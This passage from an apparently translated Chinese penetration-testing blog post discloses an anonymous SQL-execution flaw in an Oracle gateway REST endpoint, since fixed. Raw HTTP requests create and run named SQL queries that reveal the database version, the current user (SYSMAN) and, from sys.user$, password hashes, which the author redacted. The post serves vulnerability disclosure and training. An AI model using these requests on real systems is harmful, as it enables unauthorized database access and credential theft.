    Accept-Language: en-US,en;q=0.8
    Content-Length: 16
    Content-Type: application/json;charset=UTF-8
    {"test":1}
    HTTP Response:
    HTTP/1.1 400 Bad Request 
    Content-Type: text/plain
    Content-Length: 365
    Connection: close
    Unrecognized field "test" (class com.oracle.acs.gateway.model.NamedSQL), not marked as ignorable (6 known properties: "privileges", "id", "paramList", "name", "sql", "dataSourceJNDI"]) 
    &nbsp;at [Source: org.glassfish.jersey.message.internal.EntityInputStream@1c2f9d9d; line: 1, column: 14] (through reference chain: com.oracle.acs.gateway.model.NamedSQL["SQL_NAME"])
再一次不意外的获得了一个关于未知“test”字段的bad request，但是如果你注意的话，这个错误的信息给我们返回了一些有用的属性。感谢
Oracle先生的服务！这些属性也同样出现了从getNamedSqlList发出请求获得的返回中。我使用getNamedSqlList请求的返回中其中的一个值赋给dataSourceJNDI属性。
    HTTP Request:
    POST /rest/data/sql HTTP/1.1
    Host: host
    Connection: close
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8
    Content-Length: 101
    Content-Type: application/json;charset=UTF-8
    {
        "name": "test",
        "sql":"select @@version",
        "dataSourceJNDI":"jdbc/portal"
    }
这看起来是一个很好的测试请求，我们来见证一下 他是否有效。
    HTTP Response:
    HTTP/1.1 500 Internal Server Error 
    Content-Type: text/plain
    Content-Length: 200
    Connection: close
    A system error has occurred: MessageBodyWriter not found for media type=text/plain, type=class com.oracle.acs.gateway.model.NamedSQL, genericType=class com.oracle.acs.gateway.model.NamedSQL. [S2VF2VI]
我们仍然从服务器获得了一个错误返回，但是只返回了content-type。SQL语句可能已经被创建了。通过把名称字段设为“test”,
让我们尝试第一个具有参数的GET请求。
    HTTP Request:
    GET /rest/data/sql/test HTTP/1.1
    Host: host
    Connection: close
    Accept: application/json;charset=UTF-8
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8
    Content-Type: application/json;charset=UTF-8
    Content-Length: 0
    HTTP Response:
    HTTP/1.1 200 OK 
    Content-Type: application/json; charset=UTF-8
    Content-Length: 24
    Connection: close
    [{"@@version":"5.5.37"}]
看这里！我们获得了一些SQL执行。
看一下“我们”是谁。
    HTTP Request:
    POST /rest/data/sql HTTP/1.1
    Host: host
    Connection: close
    Accept: */*
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8
    Content-Length: 101
    Content-Type: application/json;charset=UTF-8
    {
        "name": "test2",
        "sql":"SELECT USER from dual;",
        "dataSourceJNDI":"jdbc/portal"
    }
    HTTP Request:
    GET /rest/data/sql/test2 HTTP/1.1
    Host: host
    Connection: close
    Accept: application/json;charset=UTF-8
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8
    Content-Type: application/json;charset=UTF-8
    Content-Length: 0
    HTTP Response:
    HTTP/1.1 200 OK 
    Content-Type: application/json; charset=UTF-8
    Content-Length: 19
    Connection: close
    [{"USER":"SYSMAN"}]
看起来我们是SYSMAN 用户。通过这个oracal
文档(https://docs.oracle.com/cd/B16351_01/doc/server.102/b14196/users_secure001.htm)
知道，我们就是administrator.
试一下 我们能否抓取出用户的哈希.
    HTTP Request:
    POST /rest/data/sql HTTP/1.1
    Host: host
    Connection: close
    Accept: */*
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8
    Content-Length: 120
    Content-Type: application/json;charset=UTF-8
    {
        "name": "test3",
        "sql":"SELECT name, password FROM sys.user$",
        "dataSourceJNDI":"jdbc/portal"
    }
    HTTP Request:
    GET /rest/data/sql/test3 HTTP/1.1
    Host: host
    Connection: close
    Accept: application/json;charset=UTF-8
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8
    Content-Type: application/json;charset=UTF-8
    Content-Length: 0
    HTTP Response:
    HTTP/1.1 200 OK 
    Content-Type: application/json; charset=UTF-8
    Content-Length: 5357
    Connection: close
    [{"NAME":"SYS","PASSWORD":"[REDACTED]"},{"NAME":"PUBLIC","PASSWORD":null},{"NAME":"CONNECT","PASSWORD":null},{"NAME":"RESOURCE","PASSWORD":null},{"NAME":"DBA","PASSWORD":null},{"NAME":"SYSTEM","PASSWORD":"[REDACTED]"},{"NAME":"SELECT_CATALOG_ROLE","PASSWORD":null},{"NAME":"EXECUTE_CATALOG_ROLE","PASSWORD":null}
    …
我们可以获得数据库中的用户密码的哈希值。我编辑和删除了主要的部分。知道了我们是一个具有administrator权限的用户，当然后续我们还可以做很多事情。然而，针对此博客的目的，我停止下来了。
**结论**
关于这个匿名sql执行我联系了oracle，他们很快的回复并且修复了这个问题。对我而言真正的问题是为什么web服务压根儿就允许sql语句被执行呢？
这个博客最大的收获是一定要看应用中的javascript文件。在多个web应用和外网的渗透测试中，我已经发现了隐藏在javascript文件中sql
注入，命令执行，和 xml实体注入攻击。
作为针对熟练渗透测试者的练习任务，看完这篇博客并且统计多少个你能确定的漏洞。提示：超过三处
**参考**